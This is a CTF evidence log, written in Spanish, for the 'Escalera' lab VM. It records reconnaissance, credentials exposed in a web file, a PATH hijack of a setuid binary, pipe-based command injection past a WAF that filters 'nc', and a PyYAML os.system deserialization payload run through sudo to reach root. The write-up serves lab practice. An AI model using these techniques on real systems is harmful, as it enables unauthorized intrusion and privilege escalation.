---
tags: [ctf, thehackerslabs, linux, evidencias, escalada, resuelta]
plataforma: TheHackers Labs
os: Ubuntu 26.04.1 LTS
estado: Resuelto
fecha: 2026-11-03
---

# Escalera — Evidencias

Nota principal: [[Escalera]] · Writeup: [[Escalera - Roadmap]]

---

## 1. Descubrimiento

```bash
nmap -sn 192.168.56.0/24
```

```
Nmap scan report for 192.168.56.111
Host is up.
MAC Address: 08:00:27:8C:06:26 (Oracle VirtualBox virtual NIC)
```

> La MAC coincide con la NIC de la VM `The Hackers Labs - Escalera`.

---

## 2. Puertos y servicios

`nmap -p- --min-rate 2000 -T4 192.168.56.111`:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8C:06:26 (Oracle VirtualBox virtual NIC)
```

`nmap -sV -sC -p22,80 192.168.56.111`:

```
22/tcp open  ssh   OpenSSH 10.2p1 Ubuntu 2ubuntu3.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http  nginx 1.28.3 (Ubuntu)
|_http-server-header: nginx/1.28.3 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ficheros completos: `nmap/nmap_allports.nmap` y `nmap/nmap_services.nmap`.

---

## 3. Web

```bash
curl -sS -i http://192.168.56.111/
```

```
HTTP/1.1 403 Forbidden
Server: nginx/1.28.3 (Ubuntu)
Content-Type: text/html
```

```bash
gobuster dir -u http://192.168.56.111/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 60 -x html,php,txt,zip,bak,old
```

```
pass.txt   (Status: 200) [Size: 23]
```

```bash
curl -s http://192.168.56.111/pass.txt
# facil:Escal0nFacil2026
```

---

## 4. Enumeración local como `facil`

```bash
id
# uid=1001(facil) gid=1001(facil) groups=1001(facil)

sudo -n -l
# Sorry, user facil may not run sudo on TheHackersLabs-Escalera.

find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/escalon_medio
# ...
```

```bash
ls -l /usr/local/bin/escalon_medio
# -rwsr-xr-x 1 medio medio 16136 ... /usr/local/bin/escalon_medio

file /usr/local/bin/escalon_medio
# setuid ELF 64-bit LSB pie executable, x86-64, not stripped
```

Símbolos relevantes:

```
system
uptime
setresuid
setresgid
geteuid
getegid
```

---

## 5. Escalada `facil` → `medio`

```bash
mkdir -p /tmp/x
printf '#!/bin/sh\nexec /bin/sh /tmp/x/cmd\n' > /tmp/x/uptime
chmod +x /tmp/x/uptime

cat > /tmp/x/cmd <<'EOF'
id
cat /home/medio/user.txt
cat /home/medio/.token
EOF

PATH=/tmp/x:$PATH /usr/local/bin/escalon_medio
```

```
uid=1002(medio) gid=1001(facil) groups=1001(facil)
THL{M3di0St3p892kLq1wZ4vX}
M3di0T0k3nS3ss10n9841X
```

---

## 6. Servicio interno

```bash
ss -lntp
# tcp LISTEN 127.0.0.1:8080
```

```bash
cat /etc/systemd/system/escalon_dificil.service
```

```ini
[Service]
Type=simple
User=dificil
Group=dificil
WorkingDirectory=/opt/escalon_dificil
ExecStart=/usr/bin/python3 /opt/escalon_dificil/app.py
```

```bash
cat /etc/systemd/system/firewall_ctf.service
```

```ini
ExecStart=/bin/bash -c "/sbin/iptables -F OUTPUT; \
  /sbin/iptables -A OUTPUT -p tcp --dport 8080 -m owner --uid-owner medio -j ACCEPT; \
  /sbin/iptables -A OUTPUT -p tcp --dport 8080 -m owner --uid-owner dificil -j ACCEPT; \
  /sbin/iptables -A OUTPUT -p tcp --dport 8080 -j REJECT"
```

Fragmento vulnerable de `app.py`:

```python
token = request.headers.get("X-Auth-Token") or request.headers.get("Authorization", "")
token = token.replace("Bearer ", "").strip()

if re.search(r"[;&]|nc\b", host):
    return render_template_string(HTML_TEMPLATE, host="", output="WAF activado")

cmd = f"ping -c 1 {host}"
output = subprocess.check_output(cmd, shell=True, ...)
```

---

## 7. RCE como `dificil`

```bash
curl -s -H "X-Auth-Token: M3di0T0k3nS3ss10n9841X" \
  -G --data-urlencode 'host=127.0.0.1 | id' \
  'http://127.0.0.1:8080/diagnostico'
```

```
<pre>uid=1003(dificil) gid=1003(dificil) groups=1003(dificil)
</pre>
```

```bash
cat /home/dificil/.credenciales
# dificil:D1f1c1lStairs89

sudo -n -l
# User dificil may run the following commands on TheHackersLabs-Escalera:
#     (root) NOPASSWD: /usr/bin/python3 /opt/admin/gestion_sistema.py *
```

---

## 8. Escalada a root

```bash
cat /opt/admin/gestion_sistema.py
```

```python
with open(cfg, "r") as f:
    contenido = f.read()
yaml.load(contenido, Loader=yaml.Loader)
```

```yaml
# /tmp/x/evil.yml
!!python/object/apply:os.system ["id > /tmp/x/root_id; cat /root/root.txt > /tmp/x/rootflag; chmod 644 /tmp/x/rootflag"]
```

```bash
sudo -n /usr/bin/python3 /opt/admin/gestion_sistema.py /tmp/x/evil.yml
```

```bash
cat /tmp/x/root_id
# uid=0(root) gid=0(root) groups=0(root)

cat /tmp/x/rootflag
# THL{R00tC1m4Esc4l3r477kNmP}
```
